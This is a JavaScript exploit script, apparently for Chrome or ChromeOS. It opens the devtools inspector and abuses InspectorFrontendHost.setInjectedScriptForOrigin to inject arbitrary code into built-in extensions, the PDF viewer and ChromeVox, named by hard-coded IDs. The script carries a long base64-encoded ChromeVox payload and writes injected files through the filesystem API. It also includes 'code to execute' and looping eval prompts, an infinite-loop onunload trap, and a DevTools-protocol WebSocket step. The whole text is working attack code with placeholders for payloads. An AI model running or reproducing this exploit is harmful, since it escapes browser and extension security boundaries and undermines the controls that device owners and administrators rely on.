((function () {
  if (!opener) {
      opener = window;
  }
  const w = window.opener.open("devtools://devtools/bundled/inspector.html");
  window.opener.close();
  w.addEventListener("load", async () => {
      if (!w.DevToolsAPI) {
          console.log("reloading");
          w.opener = null;
          w.location.reload();
      }
      await sleep(500);
      console.log("Got DevToolsAPI object from opened window:", w.DevToolsAPI);
      exploit(w);
  });

  window.w = w;


  function exploit(w) {


      function ui() {
          const pdfId = "mhjfbmdgcfjbbpaeojofohoefgiehjai";
          var globalUID = 0;
          let globalMap = [];
          function payload_swamp(w, d) {
              const pdfId = "mhjfbmdgcfjbbpaeojofohoefgiehjai"; // Redefinition because we convert this function to a string
              const mojoURL = "chrome://resources/mojo/mojo/public/js/bindings.js";
              console.log('hi');
              if (location.origin.includes("chrome-extension://" + pdfId)) {
                  w.close();
                  chrome.tabs.getCurrent(function (info) {
                      chrome.windows.create({
                          setSelfAsOpener: true,
                          url: mojoURL
                      }, function (win) {
                          const r = win.tabs[0].id;
                          chrome.tabs.executeScript(r, { code: `location.href = \"javascript:${atob('%%CHROMEPAYLOAD%%')}\"` });

                      })
                  })


                  return;
              }

              const blob_url = new Blob(["alert(1)"], { type: "text/html" });

              w.webkitRequestFileSystem(TEMPORARY, 2 * 1024 * 1024, async function (fs) {
                  function removeFile(file) {
                      return new Promise(function (resolve, reject) {
                          fs.root.getFile(file, { create: true }, function (entry) {
                              entry.remove(resolve);
                          })
                      });
                  }
                  function writeFile(file, data) {
                      return new Promise((resolve, reject) => {
                          fs.root.getFile(file, { create: true }, function (entry) {
                              entry.remove(function () {
                                  fs.root.getFile(file, { create: true }, function (entry) {
                                      entry.createWriter(function (writer) {
                                          writer.write(new Blob([data]));
                                          resolve(entry.toURL());
                                      })
                                  })
                              })
                          })
                      })
                  };
                  if (d.cleanup) {
                      console.log("cleaning up");
                      debugger;
                      await removeFile('index.js');
                      await removeFile('index.html');
                      alert("Cleaned up successfully!");
                      cleanup();
                      w.close();
                      return;
                  }
                  await writeFile('index.js', atob(`putindex.jscontentshere`))
                  const url = await writeFile('index.html', `${atob('putindex.htmlcontentshere')}<script src="./index.js" ></script>`);
                  w.chrome.tabs.create({ url });
                  w.close();
                  cleanup();
              });
          
          }
          document.open();
          document.write(atob(`putentrycontentshere`));
          document.querySelector('#activate').onclick = function () {
              dbgext(false, pdfId);
          }
          onunload = function () {
              while (true);
          }
          document.close();
          document.title = "Dashboard";
          document.querySelector('#activate2').onclick = function (ev) {

              function xd(w) {
                  w.close();
                  const pdfId = "mhjfbmdgcfjbbpaeojofohoefgiehjai"; // Redefinition because we convert this function to a string
                  const mojoURL = "chrome://resources/mojo/mojo/public/js/bindings.js";
                  chrome.tabs.getCurrent(function (tab) {
                      console.log(tab);
                      chrome.windows.create({ url: mojoURL, setSelfAsOpener: true }, function (info) {
                          async function createAndWriteFile() {
                              function writeFile(filename, content) {
                                  return new Promise((resolve) => {
                                      webkitRequestFileSystem(TEMPORARY, 2 * 1024 * 1024, function (fs) {
                                          fs.root.getFile(filename, { create: true }, function (entry) {
                                              entry.remove(function () {
                                                  fs.root.getFile(filename, { create: true }, function (entry) {
                                                      entry.createWriter(function (writer) {
                                                          writer.write(new Blob([content]))
                                                          writer.onwriteend = function () {
                                                              resolve(entry.toURL());
                                                          }
                                                      })
                                                  })
                                              })
                                          })
                                      })
                                  })

                              }
                              const htmlFile = `<html>
                              <head></head><body><iframe src="filesystem:chrome://extensions/temporary/nothing.html"></iframe>
                              </html>
                              <script>
                              onerror=  alert;
                              if (top !== window) {
                                  top.location.replace(location.href);
                              };
                              </script>
                              `
                              opener.postMessage({ url: (await writeFile('index.html', htmlFile))}, '*');
                              setTimeout(function () {
                                  close();
                              }, 800);
                          }
                          chrome.tabs.executeScript(info.tabs[0].id, { code: `(${createAndWriteFile.toString()})()` });
                          function m2(url) {
                              onmessage = function (data) {
                                  if (data.data.type === "ack") {
                                      
                                          top.location.replace("")
                                  }
                              }
                              top.postMessage({ type: 'acc' }, '*');
                          }
                          onmessage = function (dat) {
                              if (dat.data.url) {
                                  m2(dat.data.url);
                              }
                          };
                      })
                  })

              }
              dbgext(false, pdfId, xd.toString());
          }
          onmessage = function (ev) {
              if (ev.data.type === "browserInitNavigate") {
                  alert(1);
                  ev.source.location.replace(ev.data.url);
              }
          }
          document.querySelector('#updater').onclick = function (ev) {
              onunload = null;
              const ws = new WebSocket("ws://%%updaterurl%%");

              ws.onopen = function () {
                  ws.onmessage = function (ev) {
                      const received = JSON.parse(ev.data);
                      const savedURL = received.params.request.url;
                      ws.close();
                      const w = open('', '_blank');
                      console.log(savedURL);
                      w.eval(`setTimeout(function () {opener.open(atob("${btoa(savedURL)}"), '_blank'); window.close()}, 500);`);
                      setTimeout(() => { location.reload() });
                  }
                  ws.send(JSON.stringify({
                      method: "Target.setDiscoverTargets",
                      id: 999,
                      params: {}
                  }));
              }

          }
          onmessage = function (d) {
              if (d.data.type === "acc") {
                  onunload = function () { while (true); };
                  d.source.postMessage({ type: "ack" }, '*');
                  
              };

              if (!globalMap[d.data.uid]) return;

              for (const frame of globalMap) {
                  if (!frame) continue;
                  if (frame.idx === d.data.uid) {
                      frame.remove();
                      delete globalMap[globalMap.indexOf(frame)];
                      return;
                  }
              }
          }
          function dbgext(cleanup, id, payload) {
              let x = id;
              while (!x) {
                  x = prompt('Extension id?');
                  if (x === "cancel") {
                      return;
                  }
              }
              let path = '//manifest.json';
              let is_pdf = false;
              let injected = payload ?? payload_swamp.toString();
              if (x === pdfId) {
                  path = "index.html"; // pdf viewer hack
                  is_pdf = true;
                  const b = prompt("code to execute!");
                  if (!b) return;
                  injected = injected.replace('%%CHROMEPAYLOAD%%', btoa(b));
                  InspectorFrontendHost.setInjectedScriptForOrigin('chrome://policy', b+'//');
                  
              }
              const URL_1 = `chrome-extension://${x ??
                  alert("NOTREACHED")}/${path}`;
              InspectorFrontendHost.setInjectedScriptForOrigin(new URL(URL_1).origin, `window.cleanup = ()=>{window.parent.postMessage({type: "remove", uid: window.sys.passcode}, '*');} ;onmessage = function (data) {window.sys = data.data; const w = open(origin + '/${path}'); w.onload = function () {(${injected})(w, data.data)} }//`);
              const ifr = document.createElement("iframe");
              ifr.src = URL_1;
              document.body.appendChild(ifr);
              const ifrid = globalMap.push(ifr) - 1;
              ifr.idx = ifrid;
              ifr.onload = function () {

                  ifr.contentWindow.postMessage({
                      type: "uidpass", passcode:
                          ifrid,
                      cleanup: cleanup
                  }, '*');
              }

          }
          document.querySelector('#chromevox_hijack').onclick = function () {
              const ifr = document.createElement("iframe");
              URL_EXPR="chrome-extension://mndnfokpggljbaajbnioimlmbfngpief/chromevox/log_page/log.html"
              ifr.src = URL_EXPR;
              document.body.appendChild(ifr);
              InspectorFrontendHost.setInjectedScriptForOrigin(new URL(URL_EXPR).origin, atob('KGFzeW5jICgpID0+IHsKICBjb25zdCBmcyA9IGF3YWl0IG5ldyBQcm9taXNlKGZ1bmN0aW9uIChyZXNvbHZlKSB7CiAgICB3ZWJraXRSZXF1ZXN0RmlsZVN5c3RlbShQRVJTSVNURU5ULCAyICogMTAyNCAqIDEwMjQsIHJlc29sdmUpOwogIH0pOwoKICBmdW5jdGlvbiB3cml0ZUZpbGUoZmlsZSwgZGF0YSkgewogICAgcmV0dXJuIG5ldyBQcm9taXNlKChyZXNvbHZlLCByZWplY3QpID0+IHsKICAgICAgZnMucm9vdC5nZXRGaWxlKGZpbGUsIHsgY3JlYXRlOiB0cnVlIH0sIGZ1bmN0aW9uIChlbnRyeSkgewogICAgICAgIGVudHJ5LnJlbW92ZSgKICAgICAgICAgIGZ1bmN0aW9uICgpIHsKICAgICAgICAgICAgZnMucm9vdC5nZXRGaWxlKGZpbGUsIHsgY3JlYXRlOiB0cnVlIH0sIGZ1bmN0aW9uIChlbnRyeSkgewogICAgICAgICAgICAgIGVudHJ5LmNyZWF0ZVdyaXRlcihmdW5jdGlvbiAod3JpdGVyKSB7CiAgICAgICAgICAgICAgICB3cml0ZXIud3JpdGUobmV3IEJsb2IoW2RhdGFdKSk7CiAgICAgICAgICAgICAgICB3cml0ZXIub253cml0ZWVuZCA9ICgpID0+IHJlc29sdmUoZW50cnkudG9VUkwoKSk7CiAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgIH0pOwogICAgICAgICAgfSwKICAgICAgICAgIGZ1bmN0aW9uICgpIHsKICAgICAgICAgICAgZnMucm9vdC5nZXRGaWxlKGZpbGUsIHsgY3JlYXRlOiB0cnVlIH0sIGZ1bmN0aW9uIChlbnRyeSkgewogICAgICAgICAgICAgIGVudHJ5LmNyZWF0ZVdyaXRlcihmdW5jdGlvbiAod3JpdGVyKSB7CiAgICAgICAgICAgICAgICB3cml0ZXIud3JpdGUobmV3IEJsb2IoW2RhdGFdKSk7CiAgICAgICAgICAgICAgICB3cml0ZXIub253cml0ZWVuZCA9ICgpID0+IHJlc29sdmUoZW50cnkudG9VUkwoKSk7CiAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgIH0pOwogICAgICAgICAgfQogICAgICAgICk7CiAgICAgIH0pOwogICAgfSk7CiAgfQoKICBjb25zdCBodG1sVXJsID0gYXdhaXQgd3JpdGVGaWxlKCJjaHJvbWV2b3guaHRtbCIsIGF0b2IoJ1BITmpjbWx3ZENCemNtTTlJaTR2ZG05NExtcHpJajQ4TDNOamNtbHdkRDQ9JykpOwoKICBhd2FpdCB3cml0ZUZpbGUoInZveC5qcyIsIGF0b2IoJ2IyNWxjbkp2Y2lBOUlHRnNaWEowT3dvS1kyOXVjM1FnZG05NFZHVnRjR3hoZEdVZ1BTQmdDanhrYVhZZ2FXUTlJblp2ZUY5amIyUmxYM0oxYm01bGNpSStDaUFnUEdneFBtVjJZV3dnWVhNZ1EyaHliMjFsVm05NFBDOW9NVDRLSUNBOGFESStWR2hwY3lCcGN5QnFkWE4wSUdFZ2NISnZiMllnYjJZZ1kyOXVZMlZ3ZEN3Z1ltVnNiM2NnWVhKbElHTm9jbTl0WlhadmVHVnpJSEJsY20xcGMzTnBiMjV6UEM5b01qNEtJQ0E4Y0Q1UVpYSnRhWE56YVc5dWN6b2dKSHRqYUhKdmJXVXVjblZ1ZEdsdFpTNW5aWFJOWVc1cFptVnpkQ2dwTG5CbGNtMXBjM05wYjI1ekxtcHZhVzRvSnl3Z0p5bDlQQzl3UGdvZ0lEeHdQa1Y0ZEdWdWMybHZiaUJKUkRvZ0pIdGphSEp2YldVdWNuVnVkR2x0WlM1cFpIMDhMM0ErUEdoeVBnb2dJRHgwWlhoMFlYSmxZU0JwWkQwaVkyOWtaVjlwYm5CMWRDSWdjM1I1YkdVOUluZHBaSFJvT2lBM01DVTdJR2hsYVdkb2REb2dNVFV3Y0hnN0lISmxjMmw2WlRvZ1ltOTBhRHNpUGp3dmRHVjRkR0Z5WldFK0NpQWdQR0oxZEhSdmJpQnBaRDBpWTI5a1pWOXlkVzRpUGxKMWJqd3ZZblYwZEc5dVBqeG9jajRLSUNBOFluVjBkRzl1SUdsa1BTSnphRzkzWDJabFpXUmlZV05ySWo1VGFHOTNJRVpsWldSaVlXTnJQQzlpZFhSMGIyNCtQR0p5UGdvZ0lEeGlkWFIwYjI0Z2FXUTlJbVoxYm01NVgySjFkSFJ2Ymw5d2JITmZZMnhwWTJzaVBsbHZkU0J6YUc5MWJHUWdkRzkwWVd4c2VTQmpiR2xqYXlCMGFHbHpJRzV2ZEdocGJtY2dkMmxzYkNCb1lYQndaVzRnZEhKMWMzUWdiV1U4TDJKMWRIUnZiajQ4WW5JK0NpQWdQR0oxZEhSdmJpQnBaRDBpWjJWMFgySmhkSFJsY25raVBrZGxkQ0JDWVhSMFpYSjVJSE4wWVhSMWN6d3ZZblYwZEc5dVBqeGljajRLSUNBOGRHVjRkR0Z5WldFZ2FXUTlJblJoWWw5dmNHVnVYM1Z5YkNJK1BDOTBaWGgwWVhKbFlUNDhZblYwZEc5dUlHbGtQU0owWVdKZmIzQmxibVZ5SWo1UGNHVnVJRlZTVENCcGJpQnVaWGNnZEdGaVBDOWlkWFIwYjI0K1BHSnlQZ284TDJScGRqNEtZRHNLQ21Oc1lYTnpJRlp2ZUNCN0NpQWdjM1JoZEdsaklHZGxkRVpUS0NrZ2V3b2dJQ0FnY21WMGRYSnVJRzVsZHlCUWNtOXRhWE5sS0hKbGMyOXNkbVVnUFQ0Z2V3b2dJQ0FnSUNCM1pXSnJhWFJTWlhGMVpYTjBSbWxzWlZONWMzUmxiU2hVUlUxUVQxSkJVbGtzSURJZ0tpQXhNREkwSUNvZ01UQXlOQ3dnY21WemIyeDJaU2s3Q2lBZ0lDQjlLVHNLSUNCOUNnb2dJSE4wWVhScFl5QmhjM2x1WXlCM2NtbDBaVVpwYkdVb1puTXNJR1pwYkdWdVlXMWxMQ0JrWVhSaEtTQjdDaUFnSUNCeVpYUjFjbTRnYm1WM0lGQnliMjFwYzJVb0tISmxjMjlzZG1Vc0lISmxhbVZqZENrZ1BUNGdld29nSUNBZ0lDQm1jeTV5YjI5MExtZGxkRVpwYkdVb1ptbHNaVzVoYldVc0lIc2dZM0psWVhSbE9pQjBjblZsSUgwc0lHVnVkSEo1SUQwK0lIc0tJQ0FnSUNBZ0lDQmxiblJ5ZVM1eVpXMXZkbVVvS0NrZ1BUNGdld29nSUNBZ0lDQWdJQ0FnWm5NdWNtOXZkQzVuWlhSR2FXeGxLR1pwYkdWdVlXMWxMQ0I3SUdOeVpXRjBaVG9nZEhKMVpTQjlMQ0JsYm5SeWVUSWdQVDRnZXdvZ0lDQWdJQ0FnSUNBZ0lDQmxiblJ5ZVRJdVkzSmxZWFJsVjNKcGRHVnlLSGR5YVhSbGNpQTlQaUI3Q2lBZ0lDQWdJQ0FnSUNBZ0lDQWdkM0pwZEdWeUxtOXVkM0pwZEdWbGJtUWdQU0FvS1NBOVBpQnlaWE52YkhabEtHVnVkSEo1TWk1MGIxVlNUQ2dwS1RzS0lDQWdJQ0FnSUNBZ0lDQWdJQ0IzY21sMFpYSXViMjVsY25KdmNpQTlJSEpsYW1WamREc0tJQ0FnSUNBZ0lDQWdJQ0FnSUNCM2NtbDBaWEl1ZDNKcGRHVW9ibVYzSUVKc2IySW9XMlJoZEdGZEtTazdDaUFnSUNBZ0lDQWdJQ0FnSUgwcE93b2dJQ0FnSUNBZ0lDQWdmU2s3Q2lBZ0lDQWdJQ0FnZlNrN0NpQWdJQ0FnSUgwcE93b2dJQ0FnZlNrN0NpQWdmUW9LSUNCemRHRjBhV01nWVhONWJtTWdjblZ1UTI5a1pTaGpiMlJsS1NCN0NpQWdJQ0JqYjI1emRDQm1jeUE5SUdGM1lXbDBJRlp2ZUM1blpYUkdVeWdwT3dvZ0lDQWdZMjl1YzNRZ2RYSnNJRDBnWVhkaGFYUWdWbTk0TG5keWFYUmxSbWxzWlNobWN5d2dJbk55WXk1cWN5SXNJR052WkdVcE93b0tJQ0FnSUM4dklGSmxiVzkyWlNCbGVHbHpkR2x1WnlCelkzSnBjSFFnYVdZZ1lXNTVDaUFnSUNCamIyNXpkQ0J2YkdSVFkzSnBjSFFnUFNCa2IyTjFiV1Z1ZEM1blpYUkZiR1Z0Wlc1MFFubEpaQ2dpWlhaaGJIVmhkR1ZmWld4bGJTSXBPd29nSUNBZ2FXWWdLRzlzWkZOamNtbHdkQ2tnYjJ4a1UyTnlhWEIwTG5KbGJXOTJaU2dwT3dvS0lDQWdJQzh2SUVGd2NHVnVaQ0J1WlhjZ2MyTnlhWEIwSUhkcGRHZ2djM0pqSUhObGRDQjBieUJtYVd4bElGVlNUQW9nSUNBZ1kyOXVjM1FnYzJOeWFYQjBJRDBnWkc5amRXMWxiblF1WTNKbFlYUmxSV3hsYldWdWRDZ2ljMk55YVhCMElpazdDaUFnSUNCelkzSnBjSFF1YVdRZ1BTQWlaWFpoYkhWaGRHVmZaV3hsYlNJN0NpQWdJQ0J6WTNKcGNIUXVjM0pqSUQwZ2RYSnNPd29nSUNBZ1pHOWpkVzFsYm5RdVltOWtlUzVoY0hCbGJtUkRhR2xzWkNoelkzSnBjSFFwT3dvZ0lIMEtDaUFnYzNSaGRHbGpJR0ZqZEdsMllYUmxLQ2tnZXdvZ0lDQWdaRzlqZFcxbGJuUXVkM0pwZEdVb2RtOTRWR1Z0Y0d4aGRHVXBPd29nSUNBZ1pHOWpkVzFsYm5RdVkyeHZjMlVvS1RzS0NpQWdJQ0JrYjJOMWJXVnVkQzVuWlhSRmJHVnRaVzUwUW5sSlpDZ2lZMjlrWlY5eWRXNGlLUzVoWkdSRmRtVnVkRXhwYzNSbGJtVnlLQ0pqYkdsamF5SXNJR0Z6ZVc1aklDZ3BJRDArSUhzS0lDQWdJQ0FnWTI5dWMzUWdZMjlrWlNBOUlHUnZZM1Z0Wlc1MExtZGxkRVZzWlcxbGJuUkNlVWxrS0NKamIyUmxYMmx1Y0hWMElpa3VkbUZzZFdVN0NpQWdJQ0FnSUdGM1lXbDBJRlp2ZUM1eWRXNURiMlJsS0dOdlpHVXBPd29nSUNBZ2ZTazdDaUFnSUNCa2IyTjFiV1Z1ZEM1blpYUkZiR1Z0Wlc1MFFubEpaQ2dpYzJodmQxOW1aV1ZrWW1GamF5SXBMbUZrWkVWMlpXNTBUR2x6ZEdWdVpYSW9JbU5zYVdOcklpd2dZWE41Ym1NZ0tDa2dQVDRnZXdvZ0lDQWdJQ0JoZDJGcGRDQldiM2d1Y25WdVEyOWtaU2hnWTJoeWIyMWxMbVpsWldSaVlXTnJVSEpwZG1GMFpTNXZjR1Z1Um1WbFpHSmhZMnNvSjNGMWFXTnJiMlptYVdObEp5azdZQ2s3Q2lBZ0lDQjlLVHNLSUNBZ0lHUnZZM1Z0Wlc1MExtZGxkRVZzWlcxbGJuUkNlVWxrS0NKbWRXNXVlVjlpZFhSMGIyNWZjR3h6WDJOc2FXTnJJaWt1WVdSa1JYWmxiblJNYVhOMFpXNWxjaWdpWTJ4cFkyc2lMQ0JoYzNsdVl5QW9LU0E5UGlCN0NpQWdJQ0FnSUdGM1lXbDBJRlp2ZUM1eWRXNURiMlJsS0dCamFISnZiV1V1WVdOalpYTnphV0pwYkdsMGVWQnlhWFpoZEdVdVpHRnlhMlZ1VTJOeVpXVnVLSFJ5ZFdVcE8yQXBPd29nSUNBZ2ZTazdDaUFnSUNCa2IyTjFiV1Z1ZEM1blpYUkZiR1Z0Wlc1MFFubEpaQ2dpWjJWMFgySmhkSFJsY25raUtTNWhaR1JGZG1WdWRFeHBjM1JsYm1WeUtDSmpiR2xqYXlJc0lHRnplVzVqSUNncElEMCtJSHNLSUNBZ0lDQWdZWGRoYVhRZ1ZtOTRMbkoxYmtOdlpHVW9ZR05vY205dFpTNWhZMk5sYzNOcFltbHNhWFI1VUhKcGRtRjBaUzVuWlhSQ1lYUjBaWEo1UkdWelkzSnBjSFJwYjI0b1lXeGxjblFwTzJBcE93b2dJQ0FnZlNrN0NpQWdJQ0JrYjJOMWJXVnVkQzVuWlhSRmJHVnRaVzUwUW5sSlpDZ2lkR0ZpWDI5d1pXNWxjaUlwTG1Ga1pFVjJaVzUwVEdsemRHVnVaWElvSW1Oc2FXTnJJaXdnWVhONWJtTWdLQ2tnUFQ0Z2V3b2dJQ0FnSUNCamIyNXpkQ0IwWVdKdmNHVnVkWEpzSUQwZ1pHOWpkVzFsYm5RdVoyVjBSV3hsYldWdWRFSjVTV1FvSW5SaFlsOXZjR1Z1WDNWeWJDSXBMblpoYkhWbE93b2dJQ0FnSUNCaGQyRnBkQ0JXYjNndWNuVnVRMjlrWlNoZ1kyaHliMjFsTG5SaFluTXVZM0psWVhSbEtIdDlMQ0FvS1NBOVBpQjdJR05vY205dFpTNTBZV0p6TG5Wd1pHRjBaU2g3ZFhKc09pQWlZQ3QwWVdKdmNHVnVkWEpzSzJBaWZTazdJR05vY205dFpTNTBZV0p6TG5KbGJHOWhaQ2dwT3lCOUtUdGdLVHNLSUNBZ0lIMHBPd29nSUgwS2ZRcDNhVzVrYjNjdWIyNXNiMkZrSUQwZ0tDa2dQVDRnZXdvZ0lGWnZlQzVoWTNScGRtRjBaU2dwT3dwOU93bz0nKSk7CgogIGFsZXJ0KGh0bWxVcmwpOwp9KSgpOwo=')); // <- Base64 encoding of chromevox-entry.js
          }
          document.querySelector('#extdbg').onclick = function () {
              dbgext(false);
          }
          document.querySelectorAll('.hardcoded').forEach(el => {el.onclick = function () {
              let extid = el.getAttribute("ext");
              console.log(el.innerText, extid);
              dbgext(false, extid);
              }
          });
          document.querySelector('#cleanup').onclick = function () {
              dbgext(true);
          }
          document.querySelector('#devdbg').onclick = function () {
              var l_canceled = false;
              const id = setTimeout(function m() {
                  if (l_canceled) return;
                  (new Function(prompt("Evaluate script! (type 'cancel' to cancel)")))();
                  if (!l_canceled) setTimeout(m, 0);
                  clearTimeout(id);
              });
              Object.defineProperty(window, 'cancel', {
                  get: function () {
                      l_canceled = true;
                  }, configurable: true
              })
              return;
          }
          console.log(globalMap);
      }
      w.eval(`(${ui.toString()})()`);
      window.close();

  }

  function sleep(ms) {
      return new Promise(resolve => {
          setTimeout(resolve, ms);
      });
  }
})
)()
